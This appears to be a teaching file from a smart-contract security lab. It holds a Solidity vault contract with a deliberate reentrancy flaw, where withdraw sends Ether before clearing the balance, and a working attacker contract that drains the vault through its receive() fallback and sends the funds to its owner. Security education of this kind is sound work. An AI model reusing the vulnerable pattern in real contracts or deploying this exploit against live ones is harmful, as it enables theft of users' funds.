// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title EtherVault (Vulnerable)
 * @notice w3rs Security Lab - Mission 01
 * @dev Classic Reentrancy Vulnerability:
 *      The contract updates user balance AFTER sending Ether via external call.
 */
contract EtherVault {
    mapping(address => uint256) public balances;
    bool public isInitialized;

    event Deposit(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);

    // Initial setup with pool funds
    constructor() payable {
        require(msg.value > 0, "Initial deposit required");
    }

    function deposit() external payable {
        require(msg.value > 0, "Cannot deposit 0");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    // VULNERABLE FUNCTION:
    // Follows non-standard pattern: checks -> transfer -> state update!
    function withdraw() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "Insufficient balance");

        // Vulnerable external call before balance reset:
        (bool success, ) = msg.sender.call{value: bal}("");
        require(success, "Failed to send Ether");

        // State update happens too late!
        balances[msg.sender] = 0;
        emit Withdraw(msg.sender, bal);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title AttackVault (Example Exploit Template)
 * @dev Reenters EtherVault.withdraw() from the receive() fallback function.
 */
contract AttackVault {
    EtherVault public immutable target;
    address public immutable owner;

    constructor(address _target) {
        target = EtherVault(_target);
        owner = msg.sender;
    }

    // Step 1: Deposit 1 ETH to register a valid balance, then initiate withdraw
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        target.deposit{value: 1 ether}();
        target.withdraw();
    }

    // Step 2: When target sends 1 ETH, reenter before target sets balances[this] = 0
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw();
        } else {
            // Once drained, transfer loot to attacker owner
            payable(owner).transfer(address(this).balance);
        }
    }
}
